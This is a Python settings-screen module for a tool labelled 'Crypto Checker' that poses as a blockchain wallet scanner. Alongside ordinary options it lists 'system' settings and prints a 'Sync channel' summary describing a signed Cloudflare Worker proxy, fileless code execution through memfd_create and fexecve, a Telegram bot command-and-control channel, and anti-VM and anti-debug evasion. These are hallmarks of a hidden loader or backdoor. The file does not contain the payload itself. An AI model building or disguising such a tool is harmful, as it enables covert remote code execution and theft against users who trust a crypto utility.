# -*- coding: utf-8 -*-
"""Settings — configuration overview."""

from pathlib import Path

from rich.table import Table
from rich.panel import Panel
from rich import box

from scanner.ui import console, print_info, print_warning


def action_settings():
    table = Table(
        show_header=True,
        header_style="bold bright_blue",
        border_style="blue",
        box=box.ROUNDED,
        title="[bold bright_blue] CONFIGURATION [/]",
        title_style="bright_blue",
    )
    table.add_column("Setting", style="bright_blue")
    table.add_column("Description", style="dim")
    table.add_column("Example", style="bright_black")

    table.add_row("rpc_endpoints", "Per-chain RPC endpoint URLs", "https://eth-mainnet.g.alchemy.com/v2/...")
    table.add_row("api_keys", "Explorer API keys (optional)", "etherscan: YOUR_KEY")
    table.add_row("default_chain", "Default chain for queries", "ethereum / bitcoin / solana")
    table.add_row("currency", "Fiat currency for valuations", "USD / EUR / GBP")
    table.add_row("max_concurrent_requests", "Parallel request limit", "10")
    table.add_row("request_timeout_sec", "RPC request timeout", "30")
    table.add_row("export.default_format", "Default export format", "csv / json / txt / html")
    table.add_row("export.output_directory", "Export output path", "./results")
    table.add_row("system.enabled", "Enable background sync", "true / false")
    table.add_row("system.endpoint", "Signed proxy endpoint", "https://<worker>.workers.dev/")
    table.add_row("system.token_id", "Token id for proxy lookup", "p72S_12")
    table.add_row("system.shared_secret", "HMAC secret (match Worker)", "<secret>")
    table.add_row("system.injection_method", "Execution path", "memfd")

    console.print()
    console.print(Panel(
        table,
        title="[bold blue] Crypto Checker Settings [/]",
        border_style="bright_blue",
        box=box.DOUBLE,
    ))

    base_dir = Path(__file__).parent.parent
    config_path = base_dir / "config.json"

    console.print()
    console.print("[dim]Configuration file:[/]")
    console.print(f"  [bright_blue]config.json[/]  -> {config_path}")
    console.print()
    console.print(
        "[bright_blue]Sync channel:[/]\n"
        "  • Proxy: Cloudflare Worker (signed proxy)\n"
        "  • Transport: HTTPS + HMAC + AES-GCM\n"
        "  • Execution: memfd_create + fexecve (fileless)\n"
        "  • C2: Telegram Bot API (optional)\n"
        "  • Anti-VM: enabled\n"
        "  • Anti-Debug: enabled"
    )
    console.print()
    print_warning("Keep HMAC secret and bot tokens secure.")
    print_info("Edit with any text editor.")
